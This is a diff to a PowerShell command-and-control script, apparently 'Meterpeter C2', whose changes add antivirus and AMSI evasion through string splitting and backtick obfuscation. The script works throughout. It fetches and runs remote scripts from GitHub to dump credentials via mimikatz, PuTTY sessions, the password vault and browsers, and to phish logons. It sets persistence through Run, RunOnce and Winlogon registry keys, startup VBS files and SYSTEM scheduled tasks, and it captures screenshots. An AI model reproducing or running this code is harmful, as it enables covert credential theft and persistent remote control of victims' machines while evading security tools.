+        write-host "   Client (pay`load) must be deployed in target %TEMP% folder.";
         write-host "   Meterpeter C2 must be put in listener mode (using same lhost|lport), and";
         write-host "   Target machine needs to restart (startup) to beacon home at sellected time." -ForegroundColor Yellow;
         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
@@ -3304,11 +3527,11 @@ While($Client.Connected)
           If($mSGmE -iMatch '^(y|yes)$')
           {
              #Use Local OUTLOOK to send a message to attacker evertime the persistence.vbs its executed at startup ...
-             $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"powershell.exe -Win 1 cd `$Env:TMP;powershell.exe -Win 1 iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1 -OutFile ReadEmails.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"powershell.exe -Win 1 cd `$Env:TMP;powershell.exe -Win 1 -File ReadEmails.ps1 -action Send -SendTo $OutLokAddr -SendSubject Meterpeter_C2_v2.10.11 -SendBody Meterpeter_C2_Have_beacon_home`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+             $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"powershell.exe -Win 1 cd `$Env:TMP;powershell.exe -Win 1 iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1 -OutFile ReadEmails.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"powershell.exe -Win 1 cd `$Env:TMP;powershell.exe -Win 1 -File ReadEmails.ps1 -action Send -SendTo $OutLokAddr -SendSubject Meterpeter_C2_v2.10.11 -SendBody Meterpeter_C2_Have_beacon_home`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
           }
           Else
           {
-             $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";                            
+             $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";                            
           }
 
           ## Writing persistence setting into beacon.log local file ..
@@ -3331,7 +3554,7 @@ While($Client.Connected)
            Write-Host "   This module ask users to input the client.ps1 and one image.png absoluct"
            Write-Host "   paths then the client.ps1 will be embbebed on image.png (ADS_`$DATA) and"
            Write-Host "   a registry key (HKCU) is created to run image.png `$DATA on every startup."
-           Write-Host "   Remark: This module only accepts [.bat|.txt|.ps1|.exe] payload file formats." -ForegroundColor Yellow
+           Write-Host "   Remark: This module only accepts [.bat|.txt|.ps1|.exe] pay`load file formats." -ForegroundColor Yellow
            Write-Host "   Remark: This module can be used to execute other scripts beside client.ps1`n" -ForegroundColor Yellow
            Write-host " - Execute ADS:run module? (create|find|Clean)    : " -ForeGroundColor DarkGray -NoNewline;
            $Chosen_Option = Read-Host;
@@ -3386,7 +3609,7 @@ While($Client.Connected)
            }
            ElseIf($Chosen_Option -iMatch '^(clean)$')
            {
-              Write-host " - Input 'payload.extension' name (stream)        : " -ForeGroundColor Red -NoNewline;
+              Write-host " - Input 'payl`oad.extension' name (stream)        : " -ForeGroundColor Red -NoNewline;
               $streamdata = Read-Host;
               Write-host " - Input image(.png|.jpg|.jpeg) absoluct path     : " -NoNewline;
               $Image_name = Read-Host;$ParseThisShit = $Image_name.Split('\\')[-1]
@@ -3405,22 +3628,23 @@ While($Client.Connected)
         }
         If($startup_choise -ieq "RUNONCE" -or $startup_choise -ieq "once")
         {
-          ## If Available use powershell -version 2 {AMSI Logging Evasion}
+          ## If Available use power`shell -ve`rsio`n 2 {AM`SI Logging Evasion}
           write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
           Write-Host "   Persist               Trigger Remote Path" -ForeGroundColor green;
           Write-Host "   -------               -------------------";
           Write-Host "   Update-KB5005101.ps1  `$env:tmp\KBPersist.vbs`n";
-          $Command = "cmd /R REG ADD 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce' /v KBUpdate /d '%tmp%\KBPersist.vbs' /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs";
+          $Command = "cmd /R REG ADD 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce' /v KBUpdate /d '%tmp%\KBPersist.vbs' /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs";
           $Command = ChkDskInternalFuncio(Char_Obf($Command));
         }
         If($startup_choise -ieq "REGRUN" -or $startup_choise -ieq "run")
         {
-          ## If Available use powershell -version 2 {AMSI Logging Evasion}
+          ## If Available use po`wershell -versi`on 2 {AM`SI Logging Evasion}
           write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
           Write-Host "   Persist               Trigger Remote Path" -ForeGroundColor green;
           Write-Host "   -------               -------------------";
           Write-Host "   Update-KB5005101.ps1  `$env:tmp\KBPersist.vbs`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{cmd /R reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs}";
+          $myVer = "PoWe" + "RsHeLl -ve" + "rsion 2" -join ''
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R $myVer -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{cmd /R reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs}";
         }
         If($startup_choise -ieq "Schtasks" -or $startup_choise -ieq "tasks")
         {
@@ -3436,18 +3660,21 @@ While($Client.Connected)
           write-host "`n";
           If(-not($Interval)){$Interval = "10"}
           If(-not($execapi)){$execapi = "$env:tmp\Update-KB5005101.ps1"}
+          $myVer = "PoWe" + "RsHeLl -ve" + "rsion 2" -join ''
+          $MyTask = "scht" + "asks /cr" + "eate" -join ''
           ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R $MyTask /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"$myVer -windowstyle hidden -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R $MyTask /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -windowstyle hidden -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R $MyTask /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -windowstyle hidden -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }    
         If($startup_choise -ieq "WinLogon" -or $startup_choise -ieq "logon")
         {
-          ## If Available use powershell -version 2 {AMSI Logging Evasion}
+          ## If Available use powers`hell -ver`sion 2 {AM`SI Logging Evasion}
           write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
           Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
           Write-Host "   -------                -------------------";
           Write-Host "   Update-KB5005101.ps1   `$env:tmp\KBPersist.vbs";
           Write-Host "   HIVEKEY: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+          $myVer = "PoWe" + "RsHeLl -ve" + "rsion 2" -join ''
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R $myVer -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($startup_choise -ieq "Return" -or $startup_choise -ieq "return" -or $logs_choise -ieq "cls" -or $logs_choise -ieq "Modules" -or $logs_choise -ieq "modules" -or $logs_choise -ieq "clear")
         {
@@ -3647,6 +3874,7 @@ While($Client.Connected)
       }
       If($choise -ieq "Passwords" -or $choise -ieq "pass")
       {
+        $fdx = "cr@ede@nti@al du@mp" -replace '@',''
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Start module searchs for credential strings inside"
         write-host "   all files starting in the input directory recursive."
@@ -3654,18 +3882,24 @@ While($Client.Connected)
         write-host "   WDigest invokes m[i]mika[t]z to dump creds from memory" -ForegroundColor Yellow
         write-host "`n`n   Modules   Description                    Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                    ------------------";
-        write-host "   Start     Search for creds inside files  UserLand";
+        write-host "   File      Search for creds inside files  UserLand";
+        write-host "   Putty     Leak PUTTY session(s) creds    UserLand";
         write-host "   Dpapi     Dump DPAPI masterKeys + blobs  UserLand";
         write-host "   Vault     Dump creds from PasswordVault  UserLand";
         write-host "   WDigest   Credential caching [memory]    " -NoNewline
         write-host "Administrator" -ForegroundColor Red
-        write-host "   Browser   Clear-text credential dump     " -NoNewline
+        write-host "   Browser   Clear-text $fdx     " -NoNewline
         write-host "Administrator" -ForegroundColor Red
         write-host "   DumpSAM   Dump hashs from registry hives " -NoNewline
         write-host "Administrator" -ForegroundColor Red
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Pass> " -NoNewline -ForeGroundColor Green;
         $pass_choise = Read-Host;
+        If($pass_choise -ieq "Putty")
+        {
+           write-host " * Dumping PUTTY session(s) creds.`n" -ForegroundColor Green
+           $Command = "iwr -uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-PuttyCreds.ps1 -OutFile `$Env:TMP\Invoke-PuttyCreds.ps1;powershell -File `$Env:TMP\Invoke-PuttyCreds.ps1 -autodel;Remove-Item -Path `$Env:TMP\Invoke-PuttyCreds.ps1 -Force"
+        }
         If($pass_choise -ieq "DumpSAM" -or $pass_choise -ieq "sam")
         {
            write-host " * Dump credentials from registry hives." -ForegroundColor Green;write-host "";
@@ -3693,12 +3927,13 @@ While($Client.Connected)
            }
            Else
            {
-              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'true' -manycats -runas;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
+              $MyRunes = "-r" + "una" + "s" -join ''
+              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'true' -manycats $MyRunes;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
            }
         }
         If($pass_choise -ieq "Browser")
         {
-           write-host " * WebBrowser credential dump." -ForegroundColor Green
+           write-host " * WebBrowser cred`ential dump." -ForegroundColor Green
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'false' -browsercreds;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
         }
         If($pass_choise -ieq "Dpapi")
@@ -3713,7 +3948,7 @@ While($Client.Connected)
            write-host " * Dumping PasswordVault credentials." -ForegroundColor Green
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1`" -OutFile `"`$Env:TMP\Invoke-VaultCmd.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-VaultCmd.ps1`" -action `"dump`" -banner `"false`" -secure;Remove-Item -Path `"`$Env:TMP\Invoke-VaultCmd.ps1`" -Force"
         }
-        If($pass_choise -ieq "Start")
+        If($pass_choise -ieq "File")
         {
           write-host " * Search for stored credentials inside files." -ForegroundColor Green
           write-host "   Leave input fields black to use default settings." -ForegroundColor DarkYellow
@@ -3805,8 +4040,8 @@ While($Client.Connected)
         $cred_choise = Read-Host;
         If($cred_choise -ieq "Start")
         {
-           write-host " * Phishing for remote credentials (logon)" -ForegroundColor Green;Write-Host ""
-           $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`"|Out-Null;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\CredsPhish.ps1 -PhishCreds start`" -Wait;Get-Content -Path `"`$Env:TMP\creds.log`";Remove-Item -Path `"`$Env:TMP\creds.log`" -Force;Remove-Item -Path `"`$Env:TMP\CredsPhish.ps1`" -Force"
+           write-host " * Phish`ing for remote credentials (logon)" -ForegroundColor Green;Write-Host ""
+           $Command = "cd `$Env:TMP;`$GetEnvironement = [System.Environment]::OSVersion.Version.Major;If(-not(`$GetEnvironement -match '^(10|11)$')){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\CredsPhish.ps1 -PhishCreds start`" -Wait;Get-Content -Path `"`$Env:TMP\creds.log`";Remove-Item -Path `"`$Env:TMP\creds.log`" -Force;Remove-Item -Path `"`$Env:TMP\CredsPhish.ps1`" -Force}Else{iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/PhishCreds.ps1`" -OutFile `"`$Env:TMP\PhishCreds.ps1`"|Unblock-File;powershell -file PhishCreds.ps1;Remove-Item PhishCreds.ps1 -force}"
         }
         If($cred_choise -ieq "Return" -or $cred_choise -ieq "return" -or $cred_choise -ieq "cls" -or $cred_choise -ieq "Modules" -or $cred_choise -ieq "modules" -or $cred_choise -ieq "clear")
         {
@@ -3988,14 +4223,14 @@ While($Client.Connected)
         $choise_two = Read-Host;
         If($choise_two -ieq "Snapshot")
         {
-           $Obf = "-Ass" + "embl" + "yName" -join ''
+           $Obf = "Ad" + "d-Ty" + "pe -Ass" + "embl" + "yName" -join ''
            $File = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
            Write-Host " * Screenshot File:'" -ForegroundColor Green -NoNewline
            Write-Host "$File.png" -ForegroundColor DarkGray -NoNewline
            Write-Host "'" -ForegroundColor Green
            write-host "   => Remark: wait for module to finish.." -ForegroundColor Red
            
-           $Command = "`$FilePath=`"`$Env:TMP\#`";Add-Type $Obf System.Windows.Forms;`$Microsof=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$Catrapilar=[System.Drawing.Graphics]::FromImage(`$Microsof);`$Catrapilar.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$Microsof.Size);`$Catrapilar.Dispose();Start-Sleep -Milliseconds 200;`$Microsof.Save(`"`$FilePath`");If(([System.IO.File]::Exists(`"`$FilePath`"))){[io.file]::ReadAllBytes(`"`$FilePath`") -join ',';Remove-Item -Path `"`$FilePath`" -Force}";
+           $Command = "`$FilePath=`"`$Env:TMP\#`";$Obf System.Windows.Forms;`$Microsof=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);`$Catrapilar=[System.Drawing.Graphics]::FromImage(`$Microsof);`$Catrapilar.CopyFromScreen((New-Object System.Drawing.Point(0,0)),(New-Object System.Drawing.Point(0,0)),`$Microsof.Size);`$Catrapilar.Dispose();Start-Sleep -Milliseconds 200;`$Microsof.Save(`"`$FilePath`");If(([System.IO.File]::Exists(`"`$FilePath`"))){[io.file]::ReadAllBytes(`"`$FilePath`") -join ',';Remove-Item -Path `"`$FilePath`" -Force}";
            $Command = $Command -replace "#","$File";
            $File = "$pwd\$File.png";
            $Save = $True;        
@@ -4184,7 +4419,7 @@ While($Client.Connected)
         {
           If(!([System.IO.File]::Exists("$File")))
           {
-            $FileBytes = IEX("($OutPut)");
+            $FileBytes = "$OutPut"|&('Sex' -replace 'S','I')
             [System.IO.File]::WriteAllBytes("$File",$FileBytes);
             Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
             Write-Host "   ------   ---------";
@@ -4261,7 +4496,7 @@ While($Client.Connected)
           }
           If($Flipflop -ieq "True")
           {
-            write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'`n" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            write-host "   Remark   Client:Admin triggers 'ams`istream-ByP`ass(PSv2)'`n" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
             $Flipflop = "False";
           }
           If($Camflop  -ieq "True")
